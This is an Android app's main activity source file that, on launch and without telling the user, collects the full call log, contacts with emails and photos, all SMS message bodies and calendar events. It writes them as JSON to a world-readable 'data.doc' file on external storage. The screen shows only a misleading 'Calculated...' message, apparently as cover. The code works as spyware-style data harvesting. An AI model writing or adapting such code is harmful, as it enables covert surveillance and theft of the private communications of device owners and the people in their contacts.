package com.ahv.allakumarreddy.andro1sub;

import android.content.ContentResolver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "pavan";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private JSONArray jsonArray;
    private JSONObject mainObj;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mainObj = new JSONObject();
        init();
    }

    private void init() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                getCallLog();
                getContacts();
                getSms();
                getCalEvents();
                try {
                    writeFile(mainObj.toString());
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            ((TextView)findViewById(R.id.head)).setText("Calculated...");
                        }
                    });
                } catch (IOException e) {
                    Log.d(TAG, e.getMessage());
                }
            }
        }).start();
    }

    private File writeFile(String s) throws IOException {
        File f = getMediaFile();
        RandomAccessFile rs = new RandomAccessFile(f, "rw");
        rs.setLength(0);
        rs.writeBytes(s);
        rs.close();
        return f;
    }

    private File getMediaFile() {
        File mediaStorageDir = new File(Environment.getExternalStorageDirectory(), "Andro1Sub");
        if (!mediaStorageDir.exists()) {
            if (!mediaStorageDir.mkdirs()) {
                Log.d(TAG, "failed to create or open directory");
                return null;
            }
        }

        File mediaFile;
        String filename = "";
        filename += "data.doc";
        mediaFile = new File(mediaStorageDir.getPath() + File.separator + filename);
        return mediaFile;
    }

    public boolean getCallLog() {

        jsonArray = new JSONArray();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
        } catch (SecurityException e) {
            Log.d(TAG, e.getMessage());
        }
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            addCallLogJSONData(phNumber, dir, callDayTime, callDuration);
        }
        cursor.close();
        try {
            mainObj.put("call", jsonArray);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        return true;
    }

    public void addCallLogJSONData(String pno, String callType, Date callTime, String callDur) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("pno", pno);
            obj.put("ctype", callType);
            obj.put("ctime", callTime.toString());
            obj.put("cdur", callDur);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        jsonArray.put(obj);
    }

    public String getContacts() {
        jsonArray = new JSONArray();
        String sd[] = new String[6];
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                for (int i = 0; i < sd.length; i++)
                    sd[i] = "";
                String phone = "";
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                sd[0] = id;
                sd[1] = name;
                String emailContact = "";
                String emailType = "";
                String image_uri = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI));
                Bitmap bitmap = null;
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        sd[2] = phone;
                    }
                    pCur.close();
                    Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (emailCur.moveToNext()) {
                        emailContact = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        sd[3] = emailContact;
                        sd[4] = emailType;
                    }
                    emailCur.close();
                }
                if (image_uri != null) {
                    System.out.println(Uri.parse(image_uri));
                    try {
                        bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.parse(image_uri));
                        sd[5] = bitmap.toString();
                    } catch (FileNotFoundException e) {
                    } catch (IOException e) {
                        Log.d(TAG, e.getMessage());
                    }
                }
                JSONObject obj = new JSONObject();
                try {
                    obj.put("id", sd[0]);
                    obj.put("name", sd[1]);
                    obj.put("phone", sd[2]);
                    obj.put("email", sd[3]);
                    obj.put("etype", sd[4]);
                    obj.put("img", sd[5]);
                } catch (JSONException e) {
                    Log.d(TAG, e.getMessage());
                }
                jsonArray.put(obj);
            }
        }
        cur.close();
        try {
            mainObj.put("contacts", jsonArray);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        return "1";
    }

    public boolean getSms() {
        jsonArray = new JSONArray();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    this.addSMSJSONData(c.getString(c.getColumnIndexOrThrow("_id")), c.getString(c.getColumnIndexOrThrow("address")), c.getString(c.getColumnIndexOrThrow("body")), c.getString(c.getColumnIndex("read")), new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")))).toString(), "inbox");
                } else {
                    this.addSMSJSONData(c.getString(c.getColumnIndexOrThrow("_id")), c.getString(c.getColumnIndexOrThrow("address")), c.getString(c.getColumnIndexOrThrow("body")), c.getString(c.getColumnIndex("read")), new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")))).toString(), "sent");
                }
                c.moveToNext();
            }
        } else {
            Log.d(TAG, "You have no SMS");
        }
        c.close();
        try {
            mainObj.put("sms", jsonArray);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        return true;
    }

    public void addSMSJSONData(String id, String address, String msg, String readState, String time, String folderName) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("id", id);
            obj.put("address", address);
            obj.put("msg", msg);
            obj.put("state", readState);
            obj.put("time", time);
            obj.put("fname", folderName);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        jsonArray.put(obj);
    }

    public boolean getCalEvents() {
        jsonArray = new JSONArray();
        String sd[] = new String[4];
        for (int i = 0; i < 4; i++)
            sd[i] = "";
        Cursor cursor = getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[]{"calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation"}, null,
                        null, null);
        cursor.moveToFirst();
        // fetching calendars name
        String CNames[] = new String[cursor.getCount()];
        if (CNames.length > 0) {
            for (int i = 0; i < CNames.length; i++) {

                sd[0] = cursor.getString(1);
                sd[1] = getDate(Long.parseLong(cursor.getString(3)));
                sd[2] = getDate(Long.parseLong(cursor.getString(4)));
                sd[3] = cursor.getString(2);
                CNames[i] = cursor.getString(1);
                cursor.moveToNext();
                addCalenJSONData(sd[0], sd[1], sd[2], sd[3]);
            }
        } else {
            Log.d(TAG, "no events to upload");
            return false;
        }
        try {
            mainObj.put("calender", jsonArray);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        return true;
    }

    public String getDate(long milliSeconds) {
        SimpleDateFormat formatter = new SimpleDateFormat(
                "dd/MM/yyyy hh:mm:ss a");
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }

    public void addCalenJSONData(String name, String startDate, String endDate, String des) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("name", name);
            obj.put("startdate", startDate);
            obj.put("enddate", endDate);
            obj.put("des", des);
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }
        jsonArray.put(obj);
    }
}
